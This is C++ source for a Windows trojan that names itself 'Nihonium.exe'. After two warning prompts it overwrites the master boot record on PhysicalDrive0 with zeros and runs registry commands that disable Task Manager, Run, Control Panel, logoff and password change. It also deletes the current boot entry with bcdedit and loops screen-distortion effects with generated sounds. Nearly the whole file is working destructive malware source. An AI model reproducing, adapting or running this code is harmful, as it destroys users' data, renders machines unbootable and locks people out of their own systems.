typedef struct IUnknown IUnknown;
#ifndef UNICODE
#define UNICODE
#endif

#define NOMINMAX
#include <windows.h>
#include <math.h>
#include <cstdint>
#include <cstdlib>
#include <tchar.h>
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "winmm.lib")
#define MIN(a,b) (((a)<(b))?(a):(b))
#define MAX(a,b) (((a)>(b))?(a):(b))
#include <random>
#include <string>
#include <stdint.h>

int ShiftR = 3;
int ShiftG = 0;
int ShiftB = 2;
int ShiftSpeed = 1;
int WarpSpeed = 15;

typedef struct {
    float h, s, l;
} HSL;

float HueToRGB(float v1, float v2, float vH) {
    if (vH < 0.0f) vH += 1.0f;
    if (vH > 1.0f) vH -= 1.0f;
    if ((6.0f * vH) < 1.0f) return (v1 + (v2 - v1) * 6.0f * vH);
    if ((2.0f * vH) < 1.0f) return (v2);
    if ((3.0f * vH) < 2.0f) return (v1 + (v2 - v1) * ((2.0f / 3.0f) - vH) * 6.0f);
    return v1;
}

HSL RGBtoHSL(BYTE r, BYTE g, BYTE b) {
    float R = r / 255.0f, G = g / 255.0f, B = b / 255.0f;
    float min_v = MIN(R, MIN(G, B)), max_v = MAX(R, MAX(G, B));
    float delta = max_v - min_v;
    float h = 0, s = 0, l = (max_v + min_v) / 2.0f;
    if (delta != 0) {
        s = (l < 0.5f) ? (delta / (max_v + min_v)) : (delta / (2.0f - max_v - min_v));
        if (R == max_v) h = (G - B) / delta + (G < B ? 6.0f : 0.0f);
        else if (G == max_v) h = (B - R) / delta + 2.0f;
        else h = (R - G) / delta + 4.0f;
        h /= 6.0f;
    }
    HSL res;
    res.h = h * 360.0f;
    res.s = s;
    res.l = l;
    return res;
}

DWORD HSLtoRGB(HSL hsl) {
    float h = hsl.h / 360.0f, s = hsl.s, l = hsl.l;
    BYTE r, g, b;
    if (s == 0) r = g = b = (BYTE)(l * 255);
    else {
        float v2 = (l < 0.5f) ? (l * (1.0f + s)) : ((l + s) - (l * s));
        float v1 = 2.0f * l - v2;
        r = (BYTE)(255 * HueToRGB(v1, v2, h + (1.0f / 3.0f)));
        g = (BYTE)(255 * HueToRGB(v1, v2, h));
        b = (BYTE)(255 * HueToRGB(v1, v2, h - (1.0f / 3.0f)));
    }
    return (DWORD)((r << 16) | (g << 8) | b);
}
const unsigned char MBR[512]{};

DWORD WINAPI MBROverwriter(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MBR, 512, &Bytes, NULL);
    return 1;
}

DWORD WINAPI disabler(LPVOID lpParam) {
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    system("bcdedit /delete {current}");
    return 1;
}

DWORD WINAPI taskbar(LPVOID lpvd) {
    static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
    ShowWindow(hShellWnd, SW_HIDE);
    return 0;
}

void sound1(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (t * (t >> t >> 7))
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound2(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            ((int(t * tan(t >> 5) / 300000) * t) ^ t)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound3(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (t ^ (t >> (t >> 1 >> t)) >> 7) * 1 + (t >> 15)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound4(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (((tan(t / 16)) < (tan(t >> 11))) * t) >> 1
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound5(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (t ^ ((t * t) >> 18)) * 10
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

DWORD WINAPI payload1(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = x + (int)(sin(0.01 * t + t * 0.05) * 200);
                int srcY = y + (int)(sin(0.01 * x + t * 0.05) * 200);

                if (srcX < 0) srcX += w;
                if (srcX >= w) srcX -= w;
                if (srcY < 0) srcY += h;
                if (srcY >= h) srcY -= h;

                pixel[y * w + x] = pixel[srcY * w + srcX] + t;
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        t++;
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload2(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = x + (int)(asin(sin(0.001 * x + t * 0.15)) * 400);
                int srcY = y + (int)(asin(sin(0.001 * t + t * 0.05)) * 400);

                if (srcX < 0) srcX += w;
                if (srcX >= w) srcX -= w;
                if (srcY < 0) srcY += h;
                if (srcY >= h) srcY -= h;

                pixel[y * w + x] = pixel[srcY * w + srcX] >> (2 + (3 & (t << 1)));
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        t++;
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload3(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(hdcMem, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };
    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;
    while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int srcX = (x + (int)(tan(0.0009 * t + t * 0.0009) * 320)) % w;
                int srcY = (y + (int)(tan(0.0009 * x + t * 0.0009) * 320)) % h;
                if (srcX < 0) srcX += w;
                if (srcY < 0) srcY += h;

                DWORD col = pixel[srcY * w + srcX];
                HSL hsl = RGBtoHSL((BYTE)(col >> 16), (BYTE)(col >> 8), (BYTE)col);
                hsl.h = fmodf(hsl.h + (float)(t % 360), 360.0f);
                pixel[y * w + x] = HSLtoRGB(hsl);
            }
        }

        UpdateLayeredWindow(hwnd, hdcScreen, &ptDst, &sizeWnd, hdcMem, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        t++;
    }

    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMem);
    DeleteObject(hBitmap);
    return 0;
}

DWORD WINAPI payload4(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0,0 };
    SIZE sizeWnd = { w,h };
    POINT ptDst = { 0,0 };

    BLENDFUNCTION blend = { AC_SRC_OVER,0,255,AC_SRC_ALPHA };

    RGBQUAD* pixel = (RGBQUAD*)bits;
    RGBQUAD* src = (RGBQUAD*)VirtualAlloc(0, w * h * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    int t = 0;

    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        memcpy(src, pixel, w * h * 4);

        double time = t * 0.02;

        for (int y = 0; y < h; y++)
        {
            double off = sin(time + y * 0.06) * WarpSpeed;

            for (int x = 0; x < w; x++)
            {
                int sx = x + (int)off;
                if (sx < 0) sx = 0;
                if (sx >= w) sx = w - 1;

                RGBQUAD c = src[y * w + sx];

                BYTE r = c.rgbRed;
                BYTE g = c.rgbGreen;
                BYTE b = c.rgbBlue;

                r = (BYTE)(r + ShiftR * ShiftSpeed);
                g = (BYTE)(g + ShiftG * ShiftSpeed);
                b = (BYTE)(b + ShiftB * ShiftSpeed);

                RGBQUAD out;
                out.rgbRed = r;
                out.rgbGreen = g;
                out.rgbBlue = b;
                out.rgbReserved = 255;

                pixel[y * w + x] = out;
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        t++;
    }

    VirtualFree(src, 0, MEM_RELEASE);
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload5(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(hdcMem, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };
    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;
    while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int srcX = (x + (int)(sin(0.01 * x + t * 0.05) * 100)) % w;
                int srcY = (y + (int)(sin(0.01 * t + y * 0.05) * 100)) % h;
                if (srcX < 0) srcX += w;
                if (srcY < 0) srcY += h;

                DWORD col = pixel[srcY * w + srcX];
                HSL hsl = RGBtoHSL((BYTE)(col >> 13), (BYTE)(col >> 5), (BYTE)col);
                hsl.h = fmodf(hsl.h + (float)(t % 360), 360.0f);
                pixel[y * w + x] = HSLtoRGB(hsl);
            }
        }

        UpdateLayeredWindow(hwnd, hdcScreen, &ptDst, &sizeWnd, hdcMem, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        t++;
    }

    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMem);
    DeleteObject(hBitmap);
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (MessageBoxW(0, L"you ran a trojan that is called Nihonium.exe Trojan.\n\r\nuse this malware wisely, this will cause to lose all your data and makes your computer likely unuseable.\nPlease note that the creator x0runrespond2 is not responsible for any damages or data loss this can cause to your PC, and that you realize that you're running a dangerous program. And if you don't know what these type of malwares do, please click no to make your computer safe.\n\r\nARE YOU SURE YOU REALLY LIKE TO EXECUTE THIS MALWARE?", L"Nihonium.exe by x0runrespond2", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    if (MessageBoxW(0, L"are you sure?", L"Nihonium.exe - Final Warning", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    CreateThread(0, 0, MBROverwriter, 0, 0, 0);
    CreateThread(0, 0, disabler, 0, 0, 0);
    Sleep(1000);
    HANDLE thread = CreateThread(0, 0, payload1, 0, 0, 0);
    sound1(48000, 30);
    TerminateThread(thread, 0);
    CloseHandle(thread);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
    sound2(48000, 30);
    TerminateThread(thread2, 0);
    CloseHandle(thread2);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
    sound3(48000, 30);
    TerminateThread(thread3, 0);
    CloseHandle(thread3);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
    sound4(48000, 30);
    TerminateThread(thread4, 0);
    CloseHandle(thread4);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
    sound5(48000, 30);
    TerminateThread(thread5, 0);
    CloseHandle(thread5);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
}